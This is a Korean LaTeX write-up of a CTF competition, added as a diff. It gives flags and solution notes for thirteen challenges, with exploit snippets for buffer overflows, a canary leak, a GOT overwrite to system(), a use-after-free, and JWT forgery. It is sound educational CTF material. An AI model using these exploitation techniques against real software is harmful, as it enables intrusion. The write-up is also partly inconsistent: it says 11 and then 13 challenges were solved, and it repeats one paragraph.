@@ -1,0 +1,208 @@
+\documentclass[11pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[korean]{babel}
+\usepackage{kotex}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{geometry}
+\usepackage{fancyhdr}
+\usepackage{enumitem}
+
+\geometry{margin=2.5cm}
+\pagestyle{fancy}
+\fancyhf{}
+\rhead{RUNA CTF 2025}
+\lhead{Write-up}
+\cfoot{\thepage}
+
+% 코드 스타일
+\lstset{
+    basicstyle=\footnotesize\ttfamily,
+    breaklines=true,
+    frame=single,
+    backgroundcolor=\color{gray!10}
+}
+
+\title{\textbf{RUNA CTF 2025 Write-up}}
+\author{CTF Team}
+\date{2025년 11월 29일}
+
+\begin{document}
+
+\maketitle
+
+\section{개요}
+이번 대회에서 총 11개 문제 해결함. pwn, rev, crypto 각각 다뤘고 나름 괜찮았음.
+
+\section{풀이 문제들}
+
+\subsection{1. 팔 (ARM64 Reversing)}
+\textbf{Flag:} \texttt{runa2025\{Can\_you\_r3ad\_code\_data\_in\_newbie\_rev\}}
+
+ARM64 바이너리였는데 실행하면 아무것도 안나옴. strings로 봐도 flag 안보여서 hexdump로 .data섹션 뜯어봤더니 포인터들이 .rodata 문자들 가리키고 있었음.
+
+\begin{lstlisting}[language=bash]
+readelf -x .data for_user
+\end{lstlisting}
+
+포인터 따라가니까 flag 나옴. 간단했음.
+
+\subsection{2. yeezyBof (Basic BOF)}
+\textbf{Flag:} \texttt{runa2025\{4nd\_I\_Always\_FInD\_yEAh\_I\_Alw4yS\_find\_soMeTh1nG\_wrON9\}}
+
+기본 bof. gets() 있고 win함수 있어서 그냥 ret2win.
+
+\begin{lstlisting}[language=python]
+from pwn import *
+p = remote('pwn.runa2025.kr', 7001)
+payload = b'A' * 72 + p64(0x4011f6)
+p.sendline(payload)
+p.interactive()
+\end{lstlisting}
+
+오프셋 72바이트였음.
+
+\subsection{3. peezyBof (Canary Leak)}
+\textbf{Flag:} \texttt{runa2025\{brACE\_yourSE1F\_1ll\_taKE\_y0u\_on\_4\_7rip\_dOwn\_MEmory\_1ANe\}}
+
+카나리 있는 bof. 카나리 LSB가 0x00이라서 null byte 덮어쓰고 puts로 leak하는거였음.
+
+\begin{lstlisting}[language=python]
+# canary LSB 덮기
+payload = b'A' * 40 + b'\xff'
+p.send(payload)
+leaked = p.recvline()
+canary = u64(b'\x00' + leaked[40:47])
+
+# 정상 exploit
+payload = b'A' * 40 + p64(canary) + b'B' * 8 + p64(win_addr)
+\end{lstlisting}
+
+\subsection{4. sasuke\_dular (GOT Overwrite)}
+\textbf{Flag:} \texttt{runa2025\{jESu5\_C4NT\_Sav3\_yOu\_lIFE\_574rtS\_whEn\_7He\_cHurCh\_END\}}
+
+이거 진짜 어려웠음. 일정관리 프로그램인데 normalize\_day\_input에서 음수 그대로 리턴하는 버그있음.
+
+핵심은:
+\begin{itemize}
+\item day = -2로 설정하면 puts@GOT 읽을 수 있음
+\item day = -1로 설정하면 strtol@GOT 덮을 수 있음
+\item strtol을 system으로 바꾸고 다음 입력을 "cat flag.txt"로 하면 됨
+\end{itemize}
+
+\begin{lstlisting}[language=python]
+# libc leak
+show(p, -2)
+# GOT overwrite  
+register(p, -1, 8, 9, p64(system_addr))
+# shell
+p.sendline(b'cat flag.txt')
+\end{lstlisting}
+
+메모리 레이아웃 계산이 관건이었음.
+
+\subsection{5. out may be in (Number Baseball)}
+\textbf{Flag:} \texttt{runa2025\{number\_baseball\_r3v3rs3\_3ng1n33r1ng\_is\_fun\}}
+
+숫자야구 문제. 바이너리 까보니까 237점 만들어야 함.
+10S + 5B - 3O = 237, S+B+O = 25 조건에서
+24S + 1O = 237 → S=24, B=0, O=1
+
+답은 71395였고 4번 맞히고 1번 틀리면 됨.
+
+\subsection{6. Just read this}
+\textbf{Flag:} \texttt{runa2025\{4f7b419b18d597cbabb9e4595b1c2172caac43b72c9fa65218fb1c74e3255335\}}
+
+7zip으로 열어보니까 그냥 flag 있었음. 뭔가 함정이 있나 했는데 진짜였음.
+
+\subsection{7. heap-hop (UAF)}
+\textbf{Flag:} \texttt{runa2025\{JusT\_come\_outS1DE\_fOr\_ThE\_nIGHT\_\}}
+
+UAF 문제. secret\_menu(96873)로 플래그 읽어서 malloc하고 바로 free함. 근데 user\_cnt 안올라가서 다음 malloc에서 같은 청크 재사용됨.
+
+\begin{lstlisting}[language=python]
+# 첫번째 유저 추가
+add_user(p, "user0")
+# secret menu로 flag 읽기 + free
+p.sendlineafter(b'>>', b'96873')  
+# 두번째 유저 추가 (재사용)
+add_user(p, "admin")
+# 정보 확인하면 flag 나옴
+show_users(p)
+\end{lstlisting}
+
+\subsection{8. Assem..ble?}
+\textbf{Flag:} \texttt{runa2025\{a164ace93f9455bea57c6cc6b7eba246fcb438a24b645a4d698adfbc4440273907ddbb85acee0f814692a498a76a73e36692de769f3f6a7a2350e6cafdace462\}}
+
+문자를 bit shuffle하고 XOR하고 테이블 lookup하는 알고리즘. 역산해서 각 위치별로 맞는 문자 찾으면 됨.
+
+비트셔플:
+0→5, 1→6, 2→7, 3→0, 4→1, 5→2, 6→3, 7→4
+
+.data 섹션에 인코딩된 플래그 있어서 디코딩했더니 나옴.
+
+\subsection{9. GET out of there!}
+\textbf{Flag:} \texttt{runa2025\{Welcome\_to\_RUNA\_CTF\_enjoyyy!!!!\}}
+
+HTTP 요청 문제. HEAD method로 쿼리 날리면 X-Flag 헤더에 플래그 줌.
+
+\begin{lstlisting}[language=bash]
+curl -I "http://web.runa2025.kr:5002/test?query=value"
+\end{lstlisting}
+
+\subsection{10. P2PE (PE 수정)}
+\textbf{Flag:} \texttt{runa2025\{y0u\_und3rst4nd\_PE\_file\_structur3\}}
+
+PE파일 헤더가 깨져있었음. DOS Magic(4D5A)랑 PE offset(F8) 고쳐주니까 실행됨.
+
+\begin{lstlisting}[language=python]
+data[0:2] = b'\x4D\x5A'  # MZ
+data[0x3C:0x40] = struct.pack('<I', 0xF8)  # PE offset
+\end{lstlisting}
+
+\subsection{11. Shototsu (MD4 Collision)}
+\textbf{Flag:} \texttt{runa2025\{md4\_collision\_is\_really\_danger\_crypt0system\_and\_so\_many\_pair\}}
+
+MD4 해시 충돌. 기본 충돌 메시지에 null byte 하나씩 붙여서 제출하면 됨.
+
+\begin{lstlisting}[language=python]
+m1 = base_collision_1 + b'\x00'
+m2 = base_collision_2 + b'\x00'
+\end{lstlisting}
+
+MD4 진짜 약하네.
+
+\subsection{12. Zeckendorf}
+\textbf{Flag:} \texttt{runa2025\{a357118d0694a8bfb9df30487407a3fae9f968971bc3f6accc962a13038e21c3\}}
+
+피보나치 수로 정수 표현하는 문제. 비트스트림을 12비트씩 끊어서 각 비트가 피보나치 수 포함 여부 나타냄.
+
+\begin{lstlisting}[language=python]
+for i in range(74):
+    bits = bitstream[i*12:(i+1)*12]
+    value = sum(FIBONACCI[j] for j in range(12) if bits[j] == '1')
+    flag += chr(value)
+\end{lstlisting}
+
+\subsection{13. Redeem Code (JWT)}
+\textbf{Flag:} \texttt{runa2025\{bcrypt\_truncation\_ftw\}}
+
+JWT 토큰 위조. ADMIN\_SECRET이 빈 문자열이어서 그냥 bcrypt로 체크 우회 가능했음.
+
+payload.admin = true로 설정하고 빈 시크릿으로 서명하면 됨.
+
+\section{총평}
+
+다양한 분야 문제들이 있어서 재미있었음. 특히 sasuke\_dular랑 heap-hop이 어려웠는데 배운게 많음. ARM64 rev도 처음 해봤는데 괜찮았음.
+
+다양한 분야 문제들이 있어서 재미있었음. 특히 sasuke\_dular랑 heap-hop이 어려웠는데 배운게 많음. ARM64 rev도 처음 해봤는데 괜찮았음.
+
+crypto는 기본적인 것들이어서 무난했고, web도 간단했음. 전체적으로 난이도 적당했던것 같음.
+
+총 13개 문제 풀었는데 만족스러움.
+
+\end{document}
